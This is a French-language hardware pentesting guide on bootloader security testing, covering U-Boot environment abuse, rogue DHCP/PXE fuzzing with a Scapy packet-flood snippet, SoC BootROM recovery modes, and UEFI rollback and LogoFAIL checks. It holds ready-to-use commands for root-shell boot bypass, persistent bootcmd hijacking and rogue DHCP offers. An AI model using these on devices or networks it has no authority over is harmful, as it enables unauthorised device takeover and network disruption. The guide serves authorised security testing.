# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage des appareils et tester les bootloaders tels que U-Boot et les chargeurs de type UEFI. Concentrez-vous sur l'obtention d'une exécution de code précoce, l'évaluation des protections de signature/rollback, et l'abus des chemins de récupération ou de netboot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — astuces rapides et abus de l'environnement

1. Access the interpreter shell
- Pendant le démarrage, appuyez sur une touche de break connue (souvent n'importe quelle touche, 0, espace, ou une séquence "magique" spécifique à la carte) avant l'exécution de `bootcmd` pour tomber sur l'invite U-Boot.

2. Inspect boot state and variables
- Commandes utiles :
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (méthodes de boot kernel supportées)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modify boot arguments to get a root shell
- Ajoutez `init=/bin/sh` pour que le kernel ouvre un shell au lieu de lancer init :
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Configurez le réseau et récupérez un kernel/fit image depuis le LAN :
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Si le stockage de l'env n'est pas protégé en écriture, vous pouvez persister le contrôle :
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Vérifiez des variables telles que `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` qui influent sur les chemins de fallback. Des valeurs mal configurées peuvent permettre des entrées répétées dans le shell.

6. Check debug/unsafe features
- Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` non restreint, la capacité à `loady`/`loads` via la liaison série, `env import` depuis des médias non fiables, et des kernels/ramdisks chargés sans vérification de signature.

7. U-Boot image/verification testing
- Si la plateforme affirme du secure/verified boot avec des images FIT, essayez des images non signées et trafiquées :
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou le comportement legacy `verify=n` permet souvent de booter des payloads arbitraires.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- La gestion legacy BOOTP/DHCP de U-Boot a eu des problèmes de sécurité mémoire. Par exemple, CVE‑2024‑42040 décrit une divulgation mémoire via des réponses DHCP spécialement fabriquées qui peuvent leak des octets de la mémoire U-Boot sur le réseau. Testez les chemins DHCP/PXE avec des valeurs trop longues ou aux limites (option 67 bootfile-name, vendor options, champs file/servername) et observez les blocages/leaks.
- Extrait Scapy minimal pour stresser les paramètres de boot pendant le netboot :
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Validez aussi si les champs de nom de fichier PXE sont transmis à la logique shell/loader sans sanitation lorsqu'ils sont enchaînés à des scripts de provisioning côté OS.

9. Rogue DHCP server command injection testing
- Mettez en place un service DHCP/PXE rogue et tentez d'injecter des caractères dans les champs filename ou options pour atteindre des interpréteurs de commande dans les étapes suivantes de la chaîne de boot. Les outils Metasploit DHCP auxiliary, `dnsmasq`, ou des scripts Scapy personnalisés fonctionnent bien. Isolez le réseau de labo en premier lieu.

## SoC ROM recovery modes that override normal boot

De nombreux SoC exposent un mode BootROM "loader" qui acceptera du code via USB/UART même lorsque les images flash sont invalides. Si les fuses secure-boot ne sont pas blown, cela peut fournir une exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Évaluez si l'appareil possède des eFuses/OTP secure-boot brûlés. Sinon, les modes de téléchargement BootROM contournent fréquemment toute vérification de niveau supérieur (U-Boot, kernel, rootfs) en exécutant votre payload de première étape directement depuis SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Montez la EFI System Partition (ESP) et vérifiez les composants loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, chemins de logo vendor.
- Essayez de booter avec des composants boot signés rétrogradés ou connus vulnérables si les révocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait toujours confiance à d'anciens shims/bootmanagers, vous pouvez souvent charger votre propre kernel ou `grub.cfg` depuis l'ESP pour obtenir de la persistance.

11. Boot logo parsing bugs (LogoFAIL class)
- Plusieurs firmwares OEM/IBV étaient vulnérables à des failles de parsing d'image dans DXE qui traitent les logos de boot. Si un attaquant peut placer une image craftée sur l'ESP sous un chemin spécifique au vendor (ex. `\EFI\<vendor>\logo\*.bmp`) et redémarrer, une exécution de code pendant le boot précoce peut être possible même avec Secure Boot activé. Testez si la plateforme accepte des logos fournis par l'utilisateur et si ces chemins sont modifiables depuis l'OS.

## Hardware caution

Soyez prudent lors d'interactions avec la flash SPI/NAND pendant le démarrage précoce (ex. mise à la masse de broches pour bypasser des lectures) et consultez toujours la datasheet de la flash. Des courts-circuits mal synchronisés peuvent corrompre le dispositif ou le programmateur.

## Notes and additional tips

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d'environnement entre RAM et stockage ; certaines plateformes permettent d'importer l'env depuis des médias amovibles sans authentification.
- Pour la persistance sur les systèmes Linux qui bootent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de boot suffit souvent quand aucune vérification de signature n'est appliquée.
- Si userland fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond au vrai stockage d'env. Des offsets mal configurés vous permettent de lire/écrire la mauvaise région MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
